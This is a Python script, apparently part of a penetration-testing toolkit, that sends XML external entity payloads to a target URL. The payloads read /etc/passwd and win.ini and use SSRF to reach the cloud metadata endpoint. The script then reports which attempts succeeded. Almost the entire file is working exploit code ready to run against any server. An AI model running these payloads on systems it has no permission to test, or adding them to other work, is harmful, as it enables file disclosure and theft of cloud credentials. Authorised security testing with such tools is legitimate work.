"""
GLITCHICONS ⬡ — XXE Tester v1.0
Tests: file read, SSRF via XML, blind XXE
"""
import requests, sys, time
from pathlib import Path
from datetime import datetime
from rich.console import Console
from rich.panel import Panel

console = Console()

XXE_PAYLOADS = [
    # Basic file read
    ('<?xml version="1.0"?><!DOCTYPE foo '
     '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
     '<foo>&xxe;</foo>',
     "root:"),
    # Windows
    ('<?xml version="1.0"?><!DOCTYPE foo '
     '[<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
     '<foo>&xxe;</foo>',
     "[extensions]"),
    # SSRF via XXE
    ('<?xml version="1.0"?><!DOCTYPE foo '
     '[<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
     '<foo>&xxe;</foo>',
     "ami-id"),
]

def test_xxe(url, cookies=None, headers=None, delay=1.0):
    """Test XXE injection."""
    console.print(f"\n[bold]→ XXE Injection[/bold]: {url}")
    session = requests.Session()
    if cookies:
        session.cookies.update(cookies)

    h = {"Content-Type": "application/xml",
         "Accept"      : "application/xml, text/xml, */*"}
    if headers:
        h.update(headers)

    findings = []
    for payload, indicator in XXE_PAYLOADS:
        try:
            r = session.post(
                url, data=payload,
                headers=h, timeout=10, verify=False
            )
            if indicator.lower() in r.text.lower():
                console.print(
                    f"  [red]⚠ XXE CONFIRMED: "
                    f"indicator='{indicator}' found[/red]"
                )
                findings.append({
                    "type"     : "XXE",
                    "url"      : url,
                    "indicator": indicator,
                    "status"   : r.status_code,
                    "sample"   : r.text[:300]
                })
            else:
                console.print(
                    f"  [dim]Tested: {payload[:50]}... "
                    f"→ {r.status_code}[/dim]"
                )
            time.sleep(delay)
        except Exception as e:
            console.print(f"  [dim]Error: {e}[/dim]")

    if not findings:
        console.print("  [green]No XXE found[/green]")
    return findings

def run(url, cookies=None, output_dir=None):
    console.print(Panel(
        "[bold purple]⬡ XXE TESTER[/bold purple]\n"
        f"[dim]Target: {url}[/dim]",
        border_style="purple"
    ))
    import warnings; warnings.filterwarnings("ignore")
    findings = test_xxe(url, cookies)

    if output_dir and findings:
        import json
        out = Path(output_dir)
        out.mkdir(parents=True, exist_ok=True)
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        f   = out / f"xxe_{ts}.json"
        f.write_text(json.dumps(findings, indent=2))
        console.print(f"\nReport: {f}")

    console.print(f"\n[bold]Total: {len(findings)} XXE findings[/bold]")
    return findings

if __name__ == "__main__":
    run(sys.argv[1] if len(sys.argv) > 1 else
        "https://target.example.com/api/xml")
